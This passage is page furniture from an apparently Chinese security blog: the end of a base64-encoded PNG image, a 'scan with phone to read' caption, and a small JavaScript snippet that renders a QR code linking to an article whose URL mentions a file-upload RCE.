Phx5v9+dI/WTA22r+XR56Q6un9MJ8bH8xrMHQgtkMAl09JsP+hFK41GPHhsEUR1r1+74vWi/ylhVw6zy8/cgLnQn7kWL8+dLkQ4COYjX7k1UtvYL890YS1FesLrzzODa886vEItc7WK+vJfQTW1Csf1aqvxvaElwupDWf8eyew/WCY7cxQbyVPxwzV02Nn2mde2VrvPcrtmbF9s9pKs+eIvWdnVK9a55lHTa95+HxDcgpvhN0Pht6b2/OpCFtLHJgfsXOOPJkV6EkcmIeTB4mDxEFikTwwP+L4Aj2JA/Nwv/eexy/iD8yPOL5Aj3PD5xuSk3kjLBfi9uq9qmWTQa0ljiaSV/Te+Go9sZ7EgXk4eZA4SNyRmUHqQa9HE/EFehIH5mG9iSvU4xczzZpcZySe6cuFpOHE75/A9ilrtq3V7fg0rOqP6s9c05nP9HifsjOO2PmVj/z3al477Mzek5o435B+Oi/OX7CQF3/Hb3753cdeX6tH2NdMrt/rTEtdPZy8wmuqmYfV0hdEC9QrRw/UEndYkzOzY1VTr+x8NWeZz1iPveHzDZmd1Au1bSFuq/Ps3vRko8HMEz3o3mii9+lVNw+vevTO+KgnM4PeZ0849SBxoDdxYD7j1INay6wgelBrxttCFE5+7QlsH3u9jWwuMM9GhVrqQdfNw91rfsSZWXHkndVy3YqZp2v61c3Dap1TC6qePKha4vr9GEdf4XxDVifzIn1byCPbyxNQ4T0f9VZ/j1f9+qxXPrqWPj3Oka2H9cjROqzZb959R7m9YX2JA+clFttCNJ/82hM4F/La899dfbkQX6cjdpqvW/Wq6bFmXrl7rdkT1rPi6PYlDswf4VwjmHmjB5kZJA4SC/t6rh5e1TJLLBeSASd+/wR2vzrxFtxm5V5zq+qVrcnWzMPOtmaeWmAeTl5hT2XrVUu80lPL7IpoouqJ1b/KR/fhzPMN8STehLcfDPMEVHh/bjVsPXGg54jtmXkyI5jVoqUmkgfOU69sLb6KlR6P/YkD8xmnHjhv5lGLLzAPJw8SB86JJs43xJN4E94Wko3NMLvPvln7Zl41eypbs1+uHmO98kq3HnaebM+M4w9qLfkMzqu12pfYWmLRtdmcbSGaT37tCWyfstyifHRbfbPP9Ngbtq/zI9dOf1C9ySucq6fW1B5h59g/67Em6zEPO8fajM83ZHYqL9TOhRwe/u8Xt4+9/dK+XpX1VC1xXscgsdDb2XrYWnqDnkcT8Qd6Eq+gx17z6lfrbE/YWuKg9ie2Hk4+Q2oiMwJz/ebh8w3JKbwRtv+oZ3PP4uj7cPvO1GteWa8eWT2s35qsHlbrnP6g6vFXWItvBT32mVc+qjlXj1z7zzeknsYbxNtC3N4j/Mx9O2/WY80nRdZrHlbr7Izwqtb1mqcvUMu1VtBzxJkVzDzOTb2iereFVPGMX3cCu4W4xRmvbtNtr+rRZx6vkXrFzFvrie2dceqBtcSBeTj5DF47bD1xsMqjZ+YMqYnMCMzlaGK3EE0nv+YEzoW85tyXV/3xhfTXuN6Jr2lne6q3x72n5t07y/V7rRnr6f16q663c/XYd8Q/vpB6Q2d8/wS+ZSGzja8uXZ8gPfab6zGfce+Jp2t9jnk4/iDxCqkH9+bG8wi8zpH3WxZydIGz9twJ7BbiFme8Gq13VY+ux6et8qqWvhVmPWqy13CG+YxnHjXnmT/D9oa9buIVdgt55mKn9/tPYFuI23uEV7dRt949zu168l6rc3ocf9B7onXY2/XkvTab1zVz2RnhzKzQU7VVrDe8LWRlPvXfPYFzIb973nev9h8AAAD//2o+sFEAAAAGSURBVAMAXYszqqANZ7YAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-file-uploadCheckImg-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 